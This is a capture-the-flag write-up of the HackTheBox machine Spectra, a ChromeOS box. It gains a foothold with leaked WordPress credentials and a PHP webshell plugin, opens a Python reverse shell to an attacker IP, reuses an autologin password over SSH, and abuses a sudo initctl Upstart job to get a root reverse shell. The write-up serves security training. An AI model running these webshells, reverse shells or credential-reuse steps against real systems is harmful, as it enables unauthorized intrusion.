---
title: HTB: Spectra
url: https://0xdf.gitlab.io/2021/06/26/htb-spectra.html
date: 2021-06-26T13:45:00+00:00
difficulty: Easy [20]
tags: hackthebox, ctf, htb-spectra, nmap, chromeos, nano, wordpress, wpscan, wordpress-plugin, credentials, password-reuse, autologon-credentials, initctl, sudo
---

![Spectra](https://0xdfimages.gitlab.io/img/spectra-cover.png)

Spectra was the first ChromeOS box on HackTheBox. I’ll start looking at a web server and find a password as well as a WordPress site. The password gets me into the admin panel, where I can edit a plugin or write a new plugin to get execution. From there I’ll find auto-login credentials and use them to get a shell as the next user. That user can control the init daemon with sudo, which I’ll abuse to get root.

## Box Info

| Name | [Spectra](https://hackthebox.com/machines/spectra)  [Spectra](https://hackthebox.com/machines/spectra) [Play on HackTheBox](https://hackthebox.com/machines/spectra) |
| --- | --- |
| Release Date | [27 Feb 2021](https://twitter.com/hackthebox_eu/status/1364598000786546691) |
| Retire Date | 26 Jun 2021 |
| OS | Chrome Chrome |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Spectra |
| Radar Graph | Radar chart for Spectra |
| First Blood User | 00:18:24[Westar Westar](https://app.hackthebox.com/users/201940) |
| First Blood Root | 00:31:46[Westar Westar](https://app.hackthebox.com/users/201940) |
| Creator | [egre55 egre55](https://app.hackthebox.com/users/1190) |

## Recon

### nmap

`nmap` found three open TCP ports, SSH (22), HTTP (80), and MySQL (3306):

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.229
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-27 22:31 EST
Nmap scan report for 10.10.10.229
Host is up (0.085s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 6.87 seconds

oxdf@parrot$ nmap -p 22,80,3306 -sCV -oA scans/nmap-tcpscripts 10.10.10.229
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-27 22:32 EST
Nmap scan report for 10.10.10.229
Host is up (0.086s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey: 
|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
80/tcp   open  http    nginx 1.17.4
|_http-server-header: nginx/1.17.4
|_http-title: Site doesn't have a title (text/html).
3306/tcp open  mysql   MySQL (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.64 seconds

```

NGINX versions are not as nicely correlated to OS, and the OpenSSH version is not one I recognize, which fits the Other OS category from HTB.

### Website - TCP 80

The webpage is pretty plain, with just some text and two links:

![image-20210127075937224](https://0xdfimages.gitlab.io/img/image-20210127075937224.png)

Both links reference `spectra.htb`, so I’ll add it to my local `/etc/hosts` file:

```
10.10.10.229 spectra.htb

```

I did run a `wfuzz` to look for any subdomains, but didn’t find any.

### spectra.htb

#### /testing/

The second link leads to `http://spectra.htb/testing/index.php` which just displays an error:

![image-20210127081111790](https://0xdfimages.gitlab.io/img/image-20210127081111790.png)

Looking at the url without `index.php`, instead of just loading `index.php`, it gives a directory listing:

![image-20210127081253871](https://0xdfimages.gitlab.io/img/image-20210127081253871.png)

Most of the files are PHP and standard WordPress files. `wp-config.php` is where the database username and password will be stored, but clicking on it will just run the PHP on the background and return an empty page. However, there’s another file, `wp-config.php.save`. `.save` files are created by `nano` ([docs](https://www.nano-editor.org/dist/v2.2/nano.1.html#NOTES)):

> In some cases **nano** will try to dump the buffer into an emergency file. This will happen mainly if **nano** receives a SIGHUP or SIGTERM or runs out of memory. It will write the buffer into a file named *nano.save* if the buffer didn’t have a name already, or will add a “.save” suffix to the current filename. If an emergency file with that name already exists in the current directory, it will add “.save” plus a number (e.g. “.save.1”) to the current filename in order to make it unique. In multibuffer mode, **nano** will write all the open buffers to their respective emergency files.

Clicking on it returns a blank page, but viewing the source (Ctrl-u, or fetching the page with `curl`) gives the text:

![image-20210127082212110](https://0xdfimages.gitlab.io/img/image-20210127082212110.png)

There’s more than that, but the interesting part is the DB connection information.

I did try to connect to 3306 using `mysql`, but it is configured to not allow connections from my IP:

```

root@kali# mysql -h 10.10.10.197 -u devtest -pdevteam01
ERROR 1130 (HY000): Host '10.10.14.7' is not allowed to connect to this MySQL server

```

I’ll note the username and password.

#### /main/

The site is titled Software Issue Management, and it is clearly a WordPress site:

![image-20210127080837302](https://0xdfimages.gitlab.io/img/image-20210127080837302.png)

There is one user noted on the page as the author of the “Hello world!” post, administrator.

#### wpscan

I’ll run `wpscan` against the host with `wpscan --url http://spectra.htb/main -e ap,t,tt,u --api-token $WPSCAN_API`. I’ve signed up for a free-tier API token from [wpscan.com](https://wpscan.com/) to get detailed vulnerability results in the scan, and I’ve saved it by adding `export WPSCAN_API=pOP7AM...` to my `~/.bashrc` script.

The scan didn’t find much of interest. It did confirm the administrator username.

## Shell as nginx

### WP Login

Clicking the Login link on the WP page leads to a standard WordPress login page:

![image-20210127083500553](https://0xdfimages.gitlab.io/img/image-20210127083500553.png)

The username devtest doesn’t seem to exist:

![image-20210127083543551](https://0xdfimages.gitlab.io/img/image-20210127083543551.png)

But using the password “devteam01” with the administrator user does:

[![image-20210127083622704](https://0xdfimages.gitlab.io/img/image-20210127083622704.png)](https://0xdfimages.gitlab.io/img/image-20210127083622704.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210127083622704.png)

### Webshell Upload

#### Theme Edit - Fail

There are many ways to try to go from admin login on WP to code execution. The first one I tried was to edit a theme to include a webshell. Under Appearance -> Theme Editor I get access to all the theme pages. I loaded 404 Template, and added a check to the top of the page:

![image-20210127084815031](https://0xdfimages.gitlab.io/img/image-20210127084815031.png)

When I save this, I can go to `/main/wp-content/themes/twentytwenty/404.php` to trigger it. However, when I try to save, it fails:

![image-20210127084931917](https://0xdfimages.gitlab.io/img/image-20210127084931917.png)

This is a protection put in place to stop people from doing exactly what I’m trying to do.

#### Edit Existing Plugin

On the Plugins tab, there are two existing plugins:

![image-20210127104842730](https://0xdfimages.gitlab.io/img/image-20210127104842730.png)

I’ll click on the Plugin Editor (in the menu on the left), and it takes me to the editor with Akismet Anti-Spam loaded and `akismet.php` in the editor:

![image-20210127104953647](https://0xdfimages.gitlab.io/img/image-20210127104953647.png)

I can find this plugin at `[WP root]/wp-content/plugins/[plugin name]/[filename]`:

```

root@kali# curl http://spectra.htb/main/wp-content/plugins/akismet/akismet.php
Hi there!  I'm just a plugin, not much I can do when called directly.

```

I’ll add a bit of code at the top to make it a webshell only if the parameter `0xdf` is there:

![image-20210127105232575](https://0xdfimages.gitlab.io/img/image-20210127105232575.png)

It works:

```

root@kali# curl http://spectra.htb/main/wp-content/plugins/akismet/akismet.php?0xdf=id
uid=20143(nginx) gid=20144(nginx) groups=20144(nginx)
Hi there!  I'm just a plugin, not much I can do when called directly.

```

#### New Plugin

Alternatively, I could just write my own plugin. There are tools like [Wordpwn](https://github.com/wetw0rk/malicious-wordpress-plugin) that will generate one, or a [Metasploit module](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/) that will do it, but for the sake of showing how things work under the hood, I’ll create one from scratch. A WordPress plugin can be as simple as a PHP script with some basic comments at the front in a zip file.

I’ll create the webshell and name it `0xdf.php`:

```

<?php
 /*
 Plugin Name: 0xdf Plugin
 Version: 1.0.0
 Author: 0xdf
 Author URI: wordpress.org
 License: GPL2
 */
system($_REQUEST["0xdf"]);
?>

```

The comments are necessary for WordPress to accept it as a plugin. Now I’ll add that to a zip file:

```

root@kali# zip 0xdf-plug.zip 0xdf.php
  adding: 0xdf.php (deflated 11%)

```

Under Plugins -> Add New, I’ll click the Upload Plugin button and find the zip:

![image-20210127110122700](https://0xdfimages.gitlab.io/img/image-20210127110122700.png)

When I hit Install Now, it reports success:

![image-20210127110155714](https://0xdfimages.gitlab.io/img/image-20210127110155714.png)

I don’t need to hit Activate, as installing is enough to drop the file at the right path. Now I can use `curl` or Firefox to execute commands:

```

root@kali# curl http://spectra.htb/main/wp-content/plugins/0xdf-plug/0xdf.php?0xdf=id
uid=20143(nginx) gid=20144(nginx) groups=20144(nginx)

```

### Shell

With either webshell, getting a shell is as simple as passing it a reverse shell. I like to use `curl` so it’s repeatable.

It doesn’t look like `nc` is on the host, so that eliminates several command reverse shells. I got the Python one to work:

```

root@kali# curl http://spectra.htb/main/wp-content/plugins/0xdf-plug/0xdf.php --data-urlencode "0xdf=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.7\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

```

At `nc`:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.197.
Ncat: Connection from 10.10.10.197:44864.
$ id
uid=20143(nginx) gid=20144(nginx) groups=20144(nginx)

```

I’ll upgrade my shell:

```

$ python -c 'import pty;pty.spawn("bash")'
<are/nginx/html/main/wp-content/plugins/0xdf-plug $ ^Z
[1]+  Stopped                 nc -lnvp 443
root@kali# stty raw -echo; fg
nc -lnvp 443
            reset 
reset: unknown terminal type unknown
Terminal type? screen
nginx@spectra /usr/local/share/nginx/html/main/wp-content/plugins/akismet $ 

```

## Shell as katie

### Enumeration

`/etc/lsb-release` solves the mystery about the OS:

```

nginx@spectra ~ $ cat /etc/lsb-release 
GOOGLE_RELEASE=87.3.41
CHROMEOS_RELEASE_BRANCH_NUMBER=85
CHROMEOS_RELEASE_TRACK=stable-channel
CHROMEOS_RELEASE_KEYSET=devkeys
CHROMEOS_RELEASE_NAME=Chromium OS
CHROMEOS_AUSERVER=https://cloudready-free-update-server-2.neverware.com/update
CHROMEOS_RELEASE_BOARD=chromeover64
CHROMEOS_DEVSERVER=https://cloudready-free-update-server-2.neverware.com/
CHROMEOS_RELEASE_BUILD_NUMBER=13505
CHROMEOS_CANARY_APPID={90F229CE-83E2-4FAF-8479-E368A34938B1}
CHROMEOS_RELEASE_CHROME_MILESTONE=87
CHROMEOS_RELEASE_PATCH_NUMBER=2021_01_15_2352
CHROMEOS_RELEASE_APPID=87efface-864d-49a5-9bb3-4b050a7c227a
CHROMEOS_BOARD_APPID=87efface-864d-49a5-9bb3-4b050a7c227a
CHROMEOS_RELEASE_BUILD_TYPE=Developer Build - neverware
CHROMEOS_RELEASE_VERSION=87.3.41
CHROMEOS_RELEASE_DESCRIPTION=87.3.41 (Developer Build - neverware) stable-channel chromeover64

```

It’s Chrome!

There are several home directories in `/home`:

```

nginx@spectra /home $ ls  
chronos  katie  nginx  root  user

```

I didn’t find much interesting in there, but I can’t access `katie` or `root`.

In the `/opt` directory, there’s an interesting file, `autologin.conf.orig`:

```

nginx@spectra /opt $ ls 
VirtualBox           broadcom     eeti    neverware  tpm2
autologin.conf.orig  displaylink  google  tpm1

```

This is a script that’s started on boot completion:

```

# Copyright 2016 The Chromium OS Authors. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file.
description   "Automatic login at boot"
author        "chromium-os-dev@chromium.org"
# After boot-complete starts, the login prompt is visible and is accepting
# input.
start on started boot-complete
script
  passwd=
  # Read password from file. The file may optionally end with a newline.
  for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do
    if [ -e "${dir}/passwd" ]; then
      passwd="$(cat "${dir}/passwd")"
      break
    fi
  done
  if [ -z "${passwd}" ]; then
    exit 0
  fi
  # Inject keys into the login prompt.
  #
  # For this to work, you must have already created an account on the device.
  # Otherwise, no login prompt appears at boot and the injected keys do the
  # wrong thing.
  /usr/local/sbin/inject-keys.py -s "${passwd}" -k enter

```

It checks in two paths for a `passwd` file, and if either is there, it breaks, and then runs `inject-keys.py -s $passwd -k enter`. `inject-keys.py` looks to be [this script](https://git.furworks.de/coreboot-mirror/chrome-ec/src/commit/a029c7a27f3bd1a1066db9c167c6166688fe4ef3/util/inject-keys.py) from the Chrome-ec repo, and it does what it says. Of the two paths, the first doesn’t exist, but the second does:

```

nginx@spectra /opt $ ls /mnt/stateful_partition/etc/autologin
ls: cannot access '/mnt/stateful_partition/etc/autologin': No such file or directory
nginx@spectra /opt $ ls /etc/autologin/
passwd

```

It contains what looks like a password:

```

nginx@spectra /opt $ cat /etc/autologin/passwd 
SummerHereWeCome!!

```

### ssh

#### Identify User

There are four users in `/etc/passwd` that don’t have a shell of `/bin/false`:

```

nginx@spectra /opt $ cat /etc/passwd | grep -v false
root:x:0:0:root:/root:/bin/bash
chronos:x:1000:1000:system_user:/home/chronos/user:/bin/bash
nginx:x:20155:20156::/home/nginx:/bin/bash
katie:x:20156:20157::/home/katie:/bin/bash

```

I’ll create a file with those users and run `crackmapexec` to check for SSH with that password:

```

oxdf@parrot$ crackmapexec ssh 10.10.10.229 -u users -p 'SummerHereWeCome!!' --continue-on-success
SSH         10.10.10.229    22     10.10.10.229     [*] SSH-2.0-OpenSSH_8.1
SSH         10.10.10.229    22     10.10.10.229     [-] chronos:SummerHereWeCome!! Bad authentication type; allowed types: ['publickey', 'keyboard-interactive']
SSH         10.10.10.229    22     10.10.10.229     [+] katie:SummerHereWeCome!! 
SSH         10.10.10.229    22     10.10.10.229     [-] nginx:SummerHereWeCome!! Bad authentication type; allowed types: ['publickey', 'keyboard-interactive']
SSH         10.10.10.229    22     10.10.10.229     [-] root:SummerHereWeCome!! Bad authentication type; allowed types: ['publickey', 'keyboard-interactive']

```

It worked for katie!

#### Shell

I can connect as katie over SSH:

```

oxdf@parrot$ sshpass -p 'SummerHereWeCome!!' ssh katie@10.10.10.229
katie@spectra ~ $

```

And I can get `user.txt`:

```

katie@spectra ~ $ cat user.txt
e89d27fe************************

```

## Shell as root

### Enumeration

katie has `sudo` rights on `initctl`:

```

katie@spectra ~ $ sudo -l
User katie may run the following commands on spectra:
    (ALL) SETENV: NOPASSWD: /sbin/initctl

```

`initctl` “allows a system administrator to communicate and interact with the Upstart init(8) daemon.” More on that in a minute.

katie is also a member of the `developers` group:

```

katie@spectra ~ $ id    
uid=20142(katie) gid=20142(katie) groups=20142(katie),20143(developers)

```

That provides access to a handful of files that were previously unaccessible:

```

katie@spectra ~ $ find / -type f -group developers 2>/dev/null -ls
   167026      4 -rw-rw----   1  root     developers      478 Jun 29  2020 /etc/init/test2.conf
   167738      4 -rw-rw----   1  root     developers      478 Jun 29  2020 /etc/init/test5.conf
   167742      4 -rw-rw----   1  root     developers      478 Jun 29  2020 /etc/init/test9.conf
   167737      4 -rw-rw----   1  root     developers      478 Jun 29  2020 /etc/init/test4.conf
   167741      4 -rw-rw----   1  root     developers      478 Jun 29  2020 /etc/init/test8.conf
   167740      4 -rw-rw----   1  root     developers      478 Jun 29  2020 /etc/init/test7.conf
   166685      4 -rw-rw----   1  root     developers      478 Jun 29  2020 /etc/init/test.conf
   167739      4 -rw-rw----   1  root     developers      478 Jun 29  2020 /etc/init/test6.conf
   167717      4 -rw-rw----   1  root     developers      478 Jun 29  2020 /etc/init/test3.conf
   167743      4 -rw-rw----   1  root     developers      478 Jun 29  2020 /etc/init/test10.conf
   167736      4 -rw-rw----   1  root     developers      478 Jun 29  2020 /etc/init/test1.conf
   134642      4 -rwxrwxr-x   1  root     developers      251 Jun 29  2020 /srv/nodetest.js

```

The `.conf` files are all the same:

```

katie@spectra ~ $ md5sum /etc/init/test*
9a90f209aeb456ea0e961bfde1f7a3b7  /etc/init/test.conf
9a90f209aeb456ea0e961bfde1f7a3b7  /etc/init/test1.conf
9a90f209aeb456ea0e961bfde1f7a3b7  /etc/init/test10.conf
9a90f209aeb456ea0e961bfde1f7a3b7  /etc/init/test2.conf
9a90f209aeb456ea0e961bfde1f7a3b7  /etc/init/test3.conf
9a90f209aeb456ea0e961bfde1f7a3b7  /etc/init/test4.conf
9a90f209aeb456ea0e961bfde1f7a3b7  /etc/init/test5.conf
9a90f209aeb456ea0e961bfde1f7a3b7  /etc/init/test6.conf
9a90f209aeb456ea0e961bfde1f7a3b7  /etc/init/test7.conf
9a90f209aeb456ea0e961bfde1f7a3b7  /etc/init/test8.conf
9a90f209aeb456ea0e961bfde1f7a3b7  /etc/init/test9.conf

```

They each contain a similar structure that includes `script` blocks:

```

description "Test node.js server"
author      "katie"

start on filesystem or runlevel [2345]
stop on shutdown

script

    export HOME="/srv"
    echo $$ > /var/run/nodetest.pid
    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js

end script

pre-start script
    echo "[`date`] Node Test Starting" >> /var/log/nodetest.log
end script

pre-stop script
    rm /var/run/nodetest.pid
    echo "[`date`] Node Test Stopping" >> /var/log/nodetest.log
end script

```

The node `.js` script contains a NodeJs script to start a simple Hello World style webserver:

```

var http = require("http");

http.createServer(function (request, response) {
   response.writeHead(200, {'Content-Type': 'text/plain'});
   
   response.end('Hello World\n');
}).listen(8081);

console.log('Server running at http://127.0.0.1:8081/');

```

### Upstart POC

The [initctl man page](https://linux.die.net/man/8/initctl) gives a handful of options, like `start`, `stop`, `restart`, and `list`.

As I can edit these `.conf` files, I’ll add a line to the `script` section:

```

script

    exec id > /tmp/0xdf
    export HOME="/srv"
    echo $$ > /var/run/nodetest.pid
    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js

end script

```

The service is currently stopped (and it looks like the box is regularly resetting the conf files and stopping the test services):

```

katie@spectra /etc/init $ sudo initctl status test
test stop/waiting

```

I’ll start it:

```

katie@spectra /etc/init $ sudo initctl start test
test start/running, process 51318

```

Now there’s a file in `/tmp`:

```

katie@spectra /etc/init $ cat /tmp/0xdf 
uid=0(root) gid=0(root) groups=0(root)

```

The service runs my added code as root.

### Shell

To get a shell, I’ll replace the `id` line with the same reverse shell I used earlier:

```

script

    exec python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.7",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    export HOME="/srv"
    echo $$ > /var/run/nodetest.pid
    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js

end script

```

Now I’ll start the service:

```

katie@spectra /etc/init $ sudo initctl start test
test start/running, process 51446

```

And get a shell as root:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.197.
Ncat: Connection from 10.10.10.197:44926.
# id
uid=0(root) gid=0(root) groups=0(root)

```

And `root.txt`:

```

# cat root.txt
d4451971************************

```